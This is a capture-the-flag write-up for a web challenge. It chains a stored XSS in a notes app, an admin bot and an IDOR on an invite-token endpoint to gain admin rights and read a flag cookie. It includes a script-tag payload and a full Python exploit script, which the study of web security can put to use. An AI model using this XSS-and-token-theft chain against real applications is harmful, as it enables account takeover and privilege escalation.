# Just Another Notes App 

**Category:** Web  

---

## Architecture

### 1. Stored XSS
Notes content rendered without sanitization:
```html
<div>{{ note.content }}</div>  <!-- No escaping! -->
```

### 2. Broken Access Control on `/getToken`
```python
# Returns latest unused invite - doesn't check who created it!
invite = InviteCode.query.filter_by(used=False).order_by(InviteCode.created_at.desc()).first()
```

Any user can steal invite tokens created by admin.

### 3. Flag in HttpOnly Cookie
```python
response.set_cookie('flag', FLAG, httponly=True, samesite='Lax')
```

Can't steal via `document.cookie`, but can become admin to receive it.

---

## Exploit Flow

### 1. Create XSS Note

```python
xss_payload = "<script>fetch('/admin/generate_invite',{method:'POST'})</script>"
```

When admin visits → XSS triggers `/admin/generate_invite` → creates new invite.

### 2. Send URL to Bot

```bash
ncat --ssl notesbot.chals.nitectf25.live 1337
# Solve PoW
# Submit note URL
```

### Step 3: Steal Invite Token

After bot visits, the invite exists. Any user can fetch it:
```python
r = session.get('/getToken', allow_redirects=False)
# Location: /getToken?token=XXXXX
```

### Step 4: Become Admin & Get Flag

```python
session.post('/accept_invite', data={"token": stolen_token})
session.get('/admin')  # Flag set in cookie!
```

---

## Conclusion

1. **XSS + Bot = trigger actions as admin** - Make admin generate invite for us
2. **IDOR on `/getToken`** - Returns ANY unused invite, not just yours → steal admin's invite
3. **No webhook needed** - We fetch token ourselves after bot visits
4. **HttpOnly bypass** - Don't steal cookie, become admin to receive it

## Exploit Script

```python
import subprocess
import socket
import ssl
import re
import requests
import time
requests.packages.urllib3.disable_warnings()
HOST = "https://notes.chals.nitectf25.live"
BOT_HOST = "notesbot.chals.nitectf25.live"
BOT_PORT = 1337
session = requests.Session()
# 1. Register & Login
username = "adadad123"
session.post(f"{HOST}/register", data={"username": username, "password": "adadad123"}, verify=False)
session.post(f"{HOST}/login", data={"username": username, "password": "adadad123"}, verify=False)
print(f"[*] Logged in as {username}")
# 2. Create XSS note
xss_payload = "<script>fetch('/admin/generate_invite',{method:'POST'})</script>"
session.post(f"{HOST}/notes", data={"content": xss_payload}, verify=False)
resp = session.get(f"{HOST}/notes", verify=False)
note_id = re.findall(r'/notes/([a-f0-9-]+)', resp.text)[0]
note_url = f"{HOST}/notes/{note_id}"
print(f"[*] XSS Note: {note_url}")
# 3. Send to bot (solve PoW first)
print("\n[*] Connecting to bot...")
context = ssl.create_default_context()
with socket.create_connection((BOT_HOST, BOT_PORT)) as sock:
    with context.wrap_socket(sock, server_hostname=BOT_HOST) as ssock:
        data = ssock.recv(4096).decode()
        match = re.search(r'pow_sol\.js\s+([a-f0-9]+)\s+(\d+)', data)
        challenge, difficulty = match.group(1), match.group(2)
        print(f"[*] Solving PoW (difficulty {difficulty})...")
        
        # PoW solver inline
        import hashlib
        nonce = 0
        target = '0' * int(difficulty)
        while True:
            h = hashlib.sha256((challenge + str(nonce)).encode()).hexdigest()
            if h.startswith(target):
                break
            nonce += 1
        print(f"[*] Solution: {nonce}")
        
        ssock.send(f"{nonce}\n".encode())
        time.sleep(1)
        ssock.recv(4096)
        
        ssock.send(f"{note_url}\n".encode())
        time.sleep(2)
        print(f"[+] Bot visited!")
# 4. Steal token
time.sleep(2)
r = session.get(f"{HOST}/getToken", verify=False, allow_redirects=False)
token = r.headers.get('Location', '').split('token=')[-1].split('&')[0]
print(f"[+] Stolen token: {token}")
# 5. Accept invite & get flag
session.post(f"{HOST}/accept_invite", data={"token": token}, verify=False)
session.get(f"{HOST}/admin", verify=False)
print(f"\n[+] FLAG: {session.cookies.get('flag')}")
```